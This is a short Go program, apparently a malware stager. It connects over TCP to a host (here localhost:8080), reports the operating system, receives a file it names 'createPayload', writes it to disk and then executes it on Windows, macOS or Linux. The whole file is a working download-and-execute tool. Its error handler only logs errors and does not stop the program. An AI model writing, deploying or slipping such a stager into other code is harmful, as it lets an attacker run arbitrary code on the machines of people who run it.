package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

const (
	HOST       = "localhost"
	PORT       = "8080"
	TYPE       = "tcp"
	BUFFERSIZE = 1024
)

var logger = log.New(os.Stdout, "INFO: ", log.Ldate|log.Ltime)

func fillString(retunString string, toLength int) string { // Fill string with bytes
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}

func main() {
	CONNECT := HOST + ":" + PORT
	conn, err := net.Dial(TYPE, CONNECT)
	handleError(err)
	defer conn.Close()

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	conn.Write([]byte(fillString(runtime.GOOS, 9))) // max byte array length of 9

	conn.Read(bufferFileSize)
	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)

	conn.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	createPayload, err := os.Create(fileName)
	handleError(err)
	// defer createPayload.Close()

	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < BUFFERSIZE {
			io.CopyN(createPayload, conn, (fileSize - receivedBytes))
			conn.Read(make([]byte, (receivedBytes+BUFFERSIZE)-fileSize))
			break
		}
		io.CopyN(createPayload, conn, BUFFERSIZE)
		receivedBytes += BUFFERSIZE
	}
	logger.Println("Received file completely!")
	createPayload.Close()
	if runtime.GOOS == "windows" {
		cmd, err := exec.Command(fileName).Output()
		handleError(err)
		fmt.Println(string(cmd))
	} else if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
		cmd, err := exec.Command("./" + fileName).Output()
		handleError(err)
		fmt.Println(string(cmd))
	}
}

func handleError(err error) {
	if err != nil {
		logger.Println("Error: ", err)
		return
	}
}
